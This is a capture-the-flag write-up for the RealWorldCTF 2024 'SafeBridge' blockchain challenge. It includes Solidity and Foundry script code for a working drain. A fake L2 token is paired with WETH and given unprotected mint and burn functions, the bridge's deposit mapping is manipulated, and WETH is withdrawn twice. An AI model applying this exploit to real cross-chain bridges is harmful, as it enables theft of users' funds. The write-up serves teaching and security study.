# [realworldctf-2024](https://realworldctf.com/)

## SafeBridge

**Category: blockchain** 

## Description

I've crafted what I believed to be an ultra-safe token bridge. Don't believe it?

## Structure

The bridge comprises three components:

- Decentralized contracts on Chain 1
- Decentralized contracts on Chain 2
- Central relayer Python service

From Chain 1, a token bridge can be initiated to any token on Chain 2, provided that the token on Chain 2 has stored the correct address of the corresponding token on Chain 1.
The initial deposit made from the challenge utilizes a special case with `address(0)` as the token on Chain 1.

### After the initial code review, three potential vulnerabilities were identified:

1. The `sendMessage` function is public.
  
```c++
  /**
    * Sends a cross domain message to the target messenger.
    * @param _target Target contract address.
    * @param _message Message to send to the target.
    */
  function sendMessage(address _target, bytes memory _message) public {
      bytes memory xDomainCalldata = encodeXDomainCalldata(_target, msg.sender, _message, messageNonce);

      sentMessages[keccak256(xDomainCalldata)] = true;

      emit SentMessage(_target, msg.sender, _message, messageNonce);
      messageNonce += 1;
  }
```

2. There is a potential reentrancy issue in some parts of the code.

3. A peculiar special case arises if the token is WETH.

```c++
  if (_l1Token == weth) {
      message = abi.encodeWithSelector(
          IL2ERC20Bridge.finalizeDeposit.selector, address(0), Lib_PredeployAddresses.L2_WETH, _from, _to, _amount
      );
  } else {
      message =
          abi.encodeWithSelector(IL2ERC20Bridge.finalizeDeposit.selector, _l1Token, _l2Token, _from, _to, _amount);
  }
```

Upon closer inspection and thorough testing, no issues were found for either the `sendMessage` function, which appears to be correctly protected from within the bridge contract, or the reentrancy concern.

## Solution

1. Obtain the address of WETH on Chain 1.

```c++
  c = Challenge(0x63149A7007961cAf310d707923ce36f621F8eb55);
  weth = WETH(payable(c.WETH()));
  console.logAddress(address(weth));
```

2. Create a new token on Chain 2 with this matching WETH address. Disable security checks on the mint and burn functions for this token.

```c++
  function createToken(address l1Pair) public {
      vm.startBroadcast();
      address newToken = address(new L2StandardERC20(l1Pair, "kek", "kek"));
      vm.stopBroadcast();
      console.logAddress(newToken);
  }
```

```c++
  function mint(address _to, uint256 _amount) public virtual {
      _mint(_to, _amount);
      emit Mint(_to, _amount);
  }

  function burn(address _from, uint256 _amount) public virtual {
      _burn(_from, _amount);
      emit Burn(_from, _amount);
  }
```

3. Deposit 2 ETH on Chain 1 into the pair WETH - new token.
   
   This action creates:
   - A mapping in [WETH][new token] = 2
   - Send information to Chain 2 with address(0) - original WETH matching token

```c++
  function deposit(address l2token) public {
      vm.startBroadcast();
      weth.deposit{value: 2 ether}();
      weth.approve(address(l1), 2 ether);
      l1.depositERC20(address(weth), l2token, 2 ether);
      vm.stopBroadcast();
  }
```

4. Withdraw the original WETH matching token on Chain 2 since it was received from the previous deposit.

What has changed now is that on Chain 1, the mapping [WETH][original token] = 0, and [WETH][new token] = 2.

```c++
  function withdrawDefault() public {
      vm.startBroadcast();
      l2.withdraw(address(0xDeadDeAddeAddEAddeadDEaDDEAdDeaDDeAD0000), 2 ether);
      vm.stopBroadcast();
  }
```

5. Mint yourself 2 ETH of the new token on Chain 2.
6. Withdraw the new token.

```c++
  function withdrawFake(address l2token) public {
      vm.startBroadcast();
      L2StandardERC20 asd = L2StandardERC20(l2token);
      asd.mint(address(this), 2 ether);
      asd.mint(msg.sender, 2 ether);
      l2.withdraw(address(l2token), 2 ether);
      vm.stopBroadcast();
  }
```
